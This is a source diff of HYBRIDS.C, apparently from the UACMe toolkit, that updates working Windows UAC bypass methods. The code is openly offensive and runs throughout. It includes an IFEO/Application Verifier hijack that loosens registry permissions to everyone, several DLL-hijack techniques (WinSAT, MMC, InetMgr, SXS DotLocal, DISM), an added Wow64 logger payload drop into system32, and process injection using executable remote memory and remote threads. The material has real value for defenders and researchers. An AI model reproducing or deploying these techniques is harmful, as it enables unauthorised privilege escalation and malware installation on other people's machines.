@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     2.57
+*  VERSION:     2.70
 *
-*  DATE:        01 Mar 2017
+*  DATE:        25 Mar 2017
 *
 *  Hybrid UAC bypass methods.
 *
@@ -19,7 +19,6 @@
 #include "global.h"
 #include "makecab.h"
 #include "manifest.h"
-#include "sirefef.h"
 
 ELOAD_PARAMETERS_SIREFEF g_ElevParamsSirefef;
 
@@ -34,14 +33,17 @@ ELOAD_PARAMETERS_SIREFEF g_ElevParamsSirefef;
 BOOL ucmAvrfMethod(
     CONST PVOID AvrfDll,
     DWORD AvrfDllSize
-    )
+)
 {
     BOOL bResult = FALSE, cond = FALSE;
     HKEY hKey = NULL, hSubKey = NULL;
     LRESULT lRet;
     DWORD dwValue = 0x100; // FLG_APPLICATION_VERIFIER;
-    WCHAR szCmd[MAX_PATH * 4];
+    WCHAR szBuffer[MAX_PATH * 2];
     WCHAR szSourceDll[MAX_PATH * 2];
+
+    UNICODE_STRING ustr;
+    OBJECT_ATTRIBUTES obja;
 
     if (
         (AvrfDll == NULL) ||
@@ -54,41 +56,7 @@ BOOL ucmAvrfMethod(
     do {
 
         //
-        // Set new key security dacl
-        // Red Alert: manually restore IFEO key permissions after using this tool, as they are not inherited.
-        //
-        if (!ucmMasqueradedAlterObjectSecurityCOM(T_IFEO, DACL_SECURITY_INFORMATION, SE_REGISTRY_KEY, T_SDDL_ALL_FOR_EVERYONE))
-            break;
-
-        //open IFEO key
-        lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"),
-            0, KEY_ALL_ACCESS, &hKey);
-        if ((lRet != ERROR_SUCCESS) || (hKey == NULL))
-            break;
-
-        //Set new key and values
-        hSubKey = NULL;
-        lRet = RegCreateKey(hKey, CLICONFG_EXE, &hSubKey);
-        if ((hSubKey == NULL) || (lRet != ERROR_SUCCESS))
-            break;
-
-        lRet = RegSetValueEx(hSubKey, TEXT("GlobalFlag"), 0, REG_DWORD, (BYTE*)&dwValue, sizeof(DWORD));
-        if (lRet != ERROR_SUCCESS)
-            break;
-
-        dwValue = (DWORD)_strlen(HIBIKI_DLL) * sizeof(TCHAR);
-        lRet = RegSetValueEx(hSubKey, TEXT("VerifierDlls"), 0, REG_SZ, (BYTE*)&HIBIKI_DLL, dwValue);
-        if (lRet != ERROR_SUCCESS)
-            break;
-
-        // Cleanup registry, we don't need anymore.
-        RegCloseKey(hSubKey);
-        hSubKey = NULL;
-        RegCloseKey(hKey);
-        hKey = NULL;
-
-        //
-        // Extract file to the protected directory
+        // Extract file to the protected directory.
         // First, create cab with fake msu ext, second run fusion process.
         //
         RtlSecureZeroMemory(szSourceDll, sizeof(szSourceDll));
@@ -98,19 +66,86 @@ BOOL ucmAvrfMethod(
             break;
 
         // Drop Hibiki to system32
-        if (!ucmWusaExtractPackage(CMD_EXTRACT_SYSTEM32))
+        if (!ucmWusaExtractPackage(g_ctx.szSystemDirectory))
+            break;
+
+        //
+        // Set new key security DACL.
+        // Red Alert: manually restore IFEO key permissions after using this tool, as they are not inherited.
+        //
+        if (!ucmMasqueradedAlterObjectSecurityCOM(
+            T_IFEO,
+            DACL_SECURITY_INFORMATION,
+            SE_REGISTRY_KEY,
+            T_SDDL_ALL_FOR_EVERYONE)) break;
+
+        //
+        // Open IFEO key.
+        //
+        RtlSecureZeroMemory(&ustr, sizeof(ustr));
+        RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
+        _strcpy(szBuffer, L"\\REGISTRY\\");
+        _strcat(szBuffer, T_IFEO);
+        RtlInitUnicodeString(&ustr, szBuffer);
+        InitializeObjectAttributes(&obja, &ustr, OBJ_CASE_INSENSITIVE, NULL, NULL);
+        if (!NT_SUCCESS(NtOpenKey(&hKey, MAXIMUM_ALLOWED, &obja)))
+            break;
+
+        //
+        // Create application key.
+        // 
+        hSubKey = NULL;
+        lRet = RegCreateKey(hKey, CLICONFG_EXE, &hSubKey);
+        if ((hSubKey == NULL) || (lRet != ERROR_SUCCESS))
+            break;
+
+        //
+        // Set verifier flag value.
+        //
+        lRet = RegSetValueEx(hSubKey, TEXT("GlobalFlag"), 0, REG_DWORD, (BYTE*)&dwValue, sizeof(DWORD));
+        if (lRet != ERROR_SUCCESS)
+            break;
+
+        //
+        // Set verifier dll value.
+        // 
+        dwValue = (DWORD)((1 + _strlen(HIBIKI_DLL)) * sizeof(WCHAR));
+        lRet = RegSetValueEx(hSubKey, TEXT("VerifierDlls"), 0, REG_SZ, (BYTE*)&HIBIKI_DLL, dwValue);
+        if (lRet != ERROR_SUCCESS)
+            break;
+
+        //
+        // Cleanup registry, we don't need anymore.
+        //
+        RegCloseKey(hSubKey);
+        hSubKey = NULL;
+        NtClose(hKey);
+        hKey = NULL;
+
+        //
+        // Extract file to the protected directory.
+        // First, create cab with fake msu ext, second run fusion process.
+        //
+        RtlSecureZeroMemory(szSourceDll, sizeof(szSourceDll));
+        _strcpy(szSourceDll, g_ctx.szTempDirectory);
+        _strcat(szSourceDll, HIBIKI_DLL);
+        if (!ucmCreateCabinetForSingleFile(szSourceDll, AvrfDll, AvrfDllSize))
+            break;
+
+        // Drop Hibiki to system32
+        if (!ucmWusaExtractPackage(g_ctx.szSystemDirectory))
             break;
 
         // Finally run target fusion process.
-        RtlSecureZeroMemory(szCmd, sizeof(szCmd));
-        _strcpy(szCmd, g_ctx.szSystemDirectory);
-        _strcat(szCmd, CLICONFG_EXE);
-        bResult = supRunProcess(szCmd, NULL);
+        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
+        _strcpy(szBuffer, g_ctx.szSystemDirectory);
+        _strcat(szBuffer, CLICONFG_EXE);
+        bResult = supRunProcess(szBuffer, NULL);
 
     } while (cond);
 
     if (hKey != NULL) {
-        RegCloseKey(hKey);
+        NtClose(hKey);
     }
     if (hSubKey != NULL) {
         RegCloseKey(hSubKey);
@@ -134,7 +169,7 @@ BOOL ucmWinSATMethod(
     PVOID ProxyDll,
     DWORD ProxyDllSize,
     BOOL UseWusa
-    )
+)
 {
     BOOL bResult = FALSE, cond = FALSE;
     CABDATA *Cabinet = NULL;
@@ -210,7 +245,10 @@ BOOL ucmWinSATMethod(
             }
 
             //extract package
-            bResult = ucmWusaExtractPackage(CMD_EXTRACT_WINSAT);
+            RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
+            _strcpy(szBuffer, g_ctx.szSystemDirectory);
+            _strcat(szBuffer, SYSPREP_DIR);
+            bResult = ucmWusaExtractPackage(szBuffer);
         }
         else {
 
@@ -266,11 +304,11 @@ BOOL ucmWinSATMethod(
 *
 */
 BOOL ucmMMCMethod(
-    UACBYPASSMETHOD Method,
+    UCM_METHOD Method,
     LPWSTR lpTargetDll,
     PVOID ProxyDll,
     DWORD ProxyDllSize
-    )
+)
 {
     BOOL bResult = FALSE, cond = FALSE;
     LPWSTR lpMscFile = NULL;
@@ -311,7 +349,7 @@ BOOL ucmMMCMethod(
         _strcpy(szDest, g_ctx.szSystemDirectory);
 
         switch (Method) {
-        
+
         case UacMethodMMC2:
             _strcat(szDest, WBEM_DIR);
             lpMscFile = RSOP_MSC;
@@ -358,7 +396,7 @@ BOOL ucmMMCMethod(
 */
 DWORD WINAPI ucmElevatedLaunchProc(
     ELOAD_PARAMETERS_SIREFEF *elvpar
-    )
+)
 {
     SHELLEXECUTEINFOW   shexec;
 
@@ -391,27 +429,27 @@ DWORD WINAPI ucmElevatedLaunchProc(
 */
 PZA_CONTROL_CONTEXT ucmSirefefBuildControlContext(
     VOID
-    )
+)
 {
     BOOL                bCond = FALSE, bSuccess = FALSE;
     ZA_CONTROL_CONTEXT *ctx = NULL;
     SIZE_T              sz;
     PVOID               Routine;
 
-    
+
     do {
         sz = sizeof(ZA_CONTROL_CONTEXT);
         NtAllocateVirtualMemory(NtCurrentProcess(), &ctx, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if (ctx == NULL)
             break;
 
-        RtlSecureZeroMemory(ctx, sz);     
-      
+        RtlSecureZeroMemory(ctx, sz);
+
         Routine = supNativeGetProcAddress(KERNEL32_DLL, "CopyFileW");
         if (Routine == NULL)
             break;
         ctx->pCopyFileW = RtlEncodePointer(Routine);
-        
+
         Routine = supNativeGetProcAddress(KERNEL32_DLL, "CreateRemoteThread");
         if (Routine == NULL)
             break;
@@ -451,13 +489,13 @@ PZA_CONTROL_CONTEXT ucmSirefefBuildControlContext(
         ctx->ElevatedProcedure = RtlEncodePointer(ucmElevatedLaunchProc);
 
         ctx->ElevatedParameters = &g_ElevParamsSirefef;
-       
+
         ctx->RunProcessEx = RtlEncodePointer(supRunProcessEx);
         bSuccess = TRUE;
 
     } while (bCond);
 
-    if (bSuccess != TRUE) {
+    if (bSuccess == FALSE) {
         sz = 0;
         NtFreeVirtualMemory(NtCurrentProcess(), &ctx, &sz, MEM_RELEASE);
     }
@@ -531,7 +569,7 @@ BOOL ucmSirefefMethod(
             break;
 
         bResult = za_ctx->SfCopyFile(za_ctx->szDest, za_ctx->szBuffer);
-        if (!bResult) 
+        if (!bResult)
             break;
 
         //setup basic shellcode routines
@@ -560,19 +598,19 @@ BOOL ucmSirefefMethod(
         hProcess = za_ctx->RunProcessEx(za_ctx->szBuffer, NULL, NULL, NULL);
         if (hProcess == NULL)
             break;
-        
+
         za_ctx->pNtAllocateVirtualMemory = RtlDecodePointer(za_ctx->pNtAllocateVirtualMemory);
 
         sz = (SIZE_T)opth->SizeOfImage;
         za_ctx->pNtAllocateVirtualMemory(hProcess, &remotebuffer, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-        if (remotebuffer == NULL) 
+        if (remotebuffer == NULL)
             break;
 
         za_ctx->pWriteProcessMemory = RtlDecodePointer(za_ctx->pWriteProcessMemory);
         if (!za_ctx->pWriteProcessMemory(hProcess, remotebuffer, selfmodule, opth->SizeOfImage, &sz))
             break;
 
-        za_ctx->ElevatedProcedure = RtlDecodePointer(za_ctx->ElevatedProcedure);       
+        za_ctx->ElevatedProcedure = RtlDecodePointer(za_ctx->ElevatedProcedure);
 
         newEp = (char *)remotebuffer + ((char *)za_ctx->ElevatedProcedure - (char *)selfmodule);
         newDp = (char *)remotebuffer + ((char *)za_ctx->ElevatedParameters - (char *)selfmodule);
@@ -615,7 +653,7 @@ BOOL ucmGenericAutoelevation(
     LPWSTR lpTargetDll,
     PVOID ProxyDll,
     DWORD ProxyDllSize
-    )
+)
 {
     BOOL bResult = FALSE, cond = FALSE;
     WCHAR szSource[MAX_PATH * 2];
@@ -651,7 +689,7 @@ BOOL ucmGenericAutoelevation(
         RtlSecureZeroMemory(szDest, sizeof(szDest));
         _strcpy(szDest, g_ctx.szSystemDirectory);
 
-        //drop fubuki to system32
+        //drop payload to system32
         bResult = ucmMasqueradedMoveFileCOM(szSource, szDest);
         if (!bResult) {
             break;
@@ -680,16 +718,21 @@ BOOL ucmGenericAutoelevation(
 *
 */
 BOOL ucmGWX(
-    VOID
-    )
+    PVOID ProxyDll,
+    DWORD ProxyDllSize
+)
 {
-    BOOL bResult = FALSE, cond = FALSE;
-    WCHAR szDest[MAX_PATH * 2];
-    WCHAR szSource[MAX_PATH * 2];
-    WCHAR szTargetApp[MAX_PATH * 2];
+    BOOL   bResult = FALSE, cond = FALSE;
+    SIZE_T Dummy;
+    WCHAR  szDest[MAX_PATH * 2];
+    WCHAR  szSource[MAX_PATH * 2];
+    WCHAR  szTargetApp[MAX_PATH * 2];
 
     PVOID Data = NULL, Ptr = NULL;
     ULONG DecompressedBufferSize = 0, DataSize = 0;
+
+    if ((ProxyDll == NULL) || (ProxyDllSize == 0))
+        return FALSE;
 
     do {
 
@@ -720,7 +763,7 @@ BOOL ucmGWX(
         RtlSecureZeroMemory(szSource, sizeof(szSource));
         _strcpy(szSource, g_ctx.szTempDirectory);
         _strcat(szSource, SLC_DLL);
-        if (!supWriteBufferToFile(szSource, g_ctx.PayloadDll, g_ctx.PayloadDllSize))
+        if (!supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize))
             break;
 
         //drop fubuki to system32\inetsrv
@@ -755,11 +798,13 @@ BOOL ucmGWX(
     } while (cond);
 
     if (Data != NULL) {
-        VirtualFree(Data, 0, MEM_RELEASE);
+        Dummy = 0;
+        NtFreeVirtualMemory(NtCurrentProcess(), &Data, &Dummy, MEM_RELEASE);
     }
 
     if (Ptr != NULL) {
-        VirtualFree(Ptr, 0, MEM_RELEASE);
+        Dummy = 0;
+        NtFreeVirtualMemory(NtCurrentProcess(), &Ptr, &Dummy, MEM_RELEASE);
     }
     return bResult;
 }
@@ -775,7 +820,7 @@ BOOL ucmGWX(
 BOOL ucmAutoElevateManifestDropDll(
     PVOID ProxyDll,
     DWORD ProxyDllSize
-    )
+)
 {
     WCHAR szDest[MAX_PATH * 2];
     WCHAR szSource[MAX_PATH * 2];
@@ -803,7 +848,7 @@ BOOL ucmAutoElevateManifestDropDll(
 BOOL ucmAutoElevateManifestW7(
     PVOID ProxyDll,
     DWORD ProxyDllSize
-    )
+)
 {
     BOOL bResult = FALSE, bCond = FALSE;
     WCHAR szDest[MAX_PATH * 2];
@@ -882,7 +927,7 @@ BOOL ucmAutoElevateManifestW7(
 BOOL ucmAutoElevateManifest(
     PVOID ProxyDll,
     DWORD ProxyDllSize
-    )
+)
 {
     BOOL bResult = FALSE, bCond = FALSE;
     WCHAR szDest[MAX_PATH * 2];
@@ -961,9 +1006,11 @@ BOOL ucmAutoElevateManifest(
 *
 */
 BOOL ucmInetMgrFindCallback(
-    WIN32_FIND_DATA *fdata, 
-    LPWSTR lpDirectory
-    )
+    WIN32_FIND_DATA *fdata,
+    LPWSTR lpDirectory,
+    PVOID ProxyDll,
+    DWORD ProxyDllSize
+)
 {
     BOOL            bCond = FALSE, bSuccess = FALSE;
     SIZE_T          l = 0;
@@ -1064,7 +1111,7 @@ BOOL ucmInetMgrFindCallback(
 
         _strcpy(textbuf, g_ctx.szTempDirectory);
         _strcat(textbuf, MSCOREE_DLL);
-        bSuccess = supWriteBufferToFile(textbuf, g_ctx.PayloadDll, g_ctx.PayloadDllSize);
+        bSuccess = supWriteBufferToFile(textbuf, ProxyDll, ProxyDllSize);
         if (!bSuccess)
             break;
 
@@ -1088,9 +1135,60 @@ BOOL ucmInetMgrFindCallback(
         CloseHandle(hFile);
 
     if (OutputBuffer != NULL)
-        HeapFree(NtCurrentPeb()->ProcessHeap, 0, OutputBuffer);
+        supHeapFree(OutputBuffer);
 
     return bSuccess;
+}
+
+typedef BOOL(CALLBACK *UCMX_FIND_FILE_CALLBACK)(
+    WIN32_FIND_DATA *fdata,
+    LPWSTR lpDirectory,
+    PVOID ProxyDll,
+    DWORD ProxyDllSize);
+
+/*
+* ucmxScanFiles
+*
+* Purpose:
+*
+* Find files of the given type and run callback over them.
+*
+*/
+BOOL ucmxScanFiles(
+    _In_ LPWSTR lpDirectory,
+    _In_ LPWSTR lpFileType,
+    _In_ UCMX_FIND_FILE_CALLBACK Callback,
+    _In_opt_ PVOID ProxyDll,
+    _In_opt_ DWORD ProxyDllSize
+)
+{
+    BOOL bStopEnumeration = FALSE;
+    HANDLE hFile;
+    WCHAR textbuf[MAX_PATH * 2];
+    WIN32_FIND_DATA fdata;
+
+    if ((Callback == NULL) || (lpDirectory == NULL) || (lpFileType == NULL))
+        return FALSE;
+
+    RtlSecureZeroMemory(textbuf, sizeof(textbuf));
+
+    _strncpy(textbuf, MAX_PATH, lpDirectory, MAX_PATH);
+    _strcat(textbuf, L"\\");
+    _strncpy(_strend(textbuf), 20, lpFileType, 20);
+
+    RtlSecureZeroMemory(&fdata, sizeof(fdata));
+    hFile = FindFirstFile(textbuf, &fdata);
+    if (hFile != INVALID_HANDLE_VALUE) {
+        do {
+
+            bStopEnumeration = Callback(&fdata, lpDirectory, ProxyDll, ProxyDllSize);
+            if (bStopEnumeration)
+                break;
+
+        } while (FindNextFile(hFile, &fdata));
+        FindClose(hFile);
+    }
+    return bStopEnumeration;
 }
 
 /*
@@ -1099,17 +1197,18 @@ BOOL ucmInetMgrFindCallback(
 * Purpose:
 *
 * Since Windows 10 TH2 appinfo whitelist with full path two applications, which they were unable to redesign/move.
-* Sysprep.exe and inetmgr.exe (IIS). This was made in a favor of the UAC fix where was fixed 
+* Sysprep.exe and inetmgr.exe (IIS). This was made in a favor of the UAC fix where was fixed
 * WinSAT concept method, when you can copy autoelevated executables within windows folders to do all
-* required preparations for dll hijack. However InetMgr.exe does not exist in default windows setup. 
-* This component installed only if user choose to install IIS which most of people don't use at all. 
-* InetMgr component sits in winsxs folder (packed in win8+). We will simple use it (expand if needed) and abuse dll hijack 
+* required preparations for dll hijack. However InetMgr.exe does not exist in default windows setup.
+* This component installed only if user choose to install IIS which most of people don't use at all.
+* InetMgr component sits in winsxs folder (packed in win8+). We will simple use it (expand if needed) and abuse dll hijack
 * as always directly with their hardcoded "safe" file path.
 *
 */
 BOOL ucmInetMgrMethod(
-    VOID
-    )
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
+)
 {
     BOOL bResult = FALSE, bCond = FALSE;
     WCHAR szBuffer[MAX_PATH * 2];
@@ -1152,7 +1251,14 @@ BOOL ucmInetMgrMethod(
 
                         _strcpy(szBuffer, szDirBuf);
                         _strcat(szBuffer, fdata.cFileName);
-                        bResult = supScanFiles(szBuffer, L"*.exe", (UCM_FIND_FILE_CALLBACK)&ucmInetMgrFindCallback);
+
+                        bResult = ucmxScanFiles(
+                            szBuffer,
+                            L"*.exe",
+                            (UCMX_FIND_FILE_CALLBACK)&ucmInetMgrFindCallback,
+                            ProxyDll,
+                            ProxyDllSize);
+
                         if (bResult)
                             break;
 
@@ -1179,7 +1285,7 @@ BOOL ucmInetMgrMethod(
 */
 BOOL ucmSetupAkagiLink(
     VOID
-    )
+)
 {
     BOOL bCond = FALSE, bResult = FALSE;
     HANDLE hRoot = NULL, hChild = NULL;
@@ -1224,7 +1330,7 @@ BOOL ucmSetupAkagiLink(
     // Cleanup created objects if something went wrong.
     // Otherwise objects will die together with process at exit.
     //
-    if (bResult != TRUE) {
+    if (bResult == FALSE) {
         if (hRoot) {
             NtClose(hRoot);
         }
@@ -1246,8 +1352,8 @@ BOOL ucmSetupAkagiLink(
 *
 * Exploit SXS Local Redirect feature.
 *
-* SXS/Fusion uses dll redirection, attempting to load internal manifest dependencies from 
-* non existent directory (this is so called DotLocal dll redirection), it is trying to do this 
+* SXS/Fusion uses dll redirection, attempting to load internal manifest dependencies from
+* non existent directory (this is so called DotLocal dll redirection), it is trying to do this
 * before going to WinSXS store.
 *
 * In this case dependency is Microsoft.Windows.Common-Controls.
@@ -1263,7 +1369,7 @@ BOOL ucmSXSMethod(
     LPWSTR lpTargetApplication, //executable name
     LPWSTR lpLaunchApplication, //executable name, must be in same dir as lpTargetApplication
     BOOL bConsentItself
-    )
+)
 {
     BOOL     bCond = FALSE, bResult = FALSE;
     WCHAR   *lpszFullDllPath = NULL, *lpszDirectoryName = NULL;
@@ -1271,7 +1377,7 @@ BOOL ucmSXSMethod(
     LPWSTR   lpSxsPath = NULL;
 
     WCHAR szSrc[MAX_PATH * 2], szDst[MAX_PATH * 2];
-   
+
     SXS_SEARCH_CONTEXT sctx;
 
     if ((ProxyDll == NULL) || (ProxyDllSize == 0))
@@ -1378,7 +1484,7 @@ BOOL ucmSXSMethod(
         if (lpTargetDirectory) {
             _strcat(szDst, lpTargetDirectory);
         }
-       
+
         if (lpLaunchApplication) {
             _strcat(szDst, lpLaunchApplication);
         }
@@ -1389,7 +1495,7 @@ BOOL ucmSXSMethod(
         Sleep(1000);
 
     } while (bCond);
-  
+
     if (lpszFullDllPath) {
         sz = 0;
         NtFreeVirtualMemory(NtCurrentProcess(), &lpszFullDllPath, &sz, MEM_RELEASE);
@@ -1420,7 +1526,7 @@ BOOL ucmSXSMethod(
 BOOL ucmDismMethod(
     PVOID ProxyDll,
     DWORD ProxyDllSize
-    )
+)
 {
     BOOL    bCond = FALSE, bResult = FALSE;
     WCHAR   szSource[MAX_PATH * 2], szDest[MAX_PATH * 2];
@@ -1460,5 +1566,46 @@ BOOL ucmDismMethod(
 
     } while (bCond);
 
+    return bResult;
+}
+
+/*
+* ucmWow64LoggerMethod
+*
+* Purpose:
+*
+* Bypass UAC using wow64 logger dll and wow64 application.
+*
+* Trigger: 32bit version of wusa.exe
+* Loader will map and call our logger dll during wow64 process initialization.
+*
+*/
+BOOL ucmWow64LoggerMethod(
+    PVOID ProxyDll,
+    DWORD ProxyDllSize
+)
+{
+    BOOL bResult = FALSE;
+    WCHAR szTarget[MAX_PATH * 2];
+
+    //
+    // Build target application full path.
+    // We need autoelevated application from syswow64 folder ONLY.
+    //
+    _strcpy(szTarget, USER_SHARED_DATA->NtSystemRoot);
+    _strcat(szTarget, SYSWOW64_DIR);
+    _strcat(szTarget, WUSA_EXE);
+
+    bResult = ucmGenericAutoelevation(szTarget, WOW64LOG_DLL, ProxyDll, ProxyDllSize);
+    if (bResult) {
+        //
+        // Attempt to remove payload dll after execution.
+        // Warning: every wow64 application will load payload code (some will crash).
+        // Remove file IMMEDIATELY after work.
+        //
+        _strcpy(szTarget, g_ctx.szSystemDirectory);
+        _strcat(szTarget, WOW64LOG_DLL);
+        DeleteFile(szTarget);
+    }
     return bResult;
 }
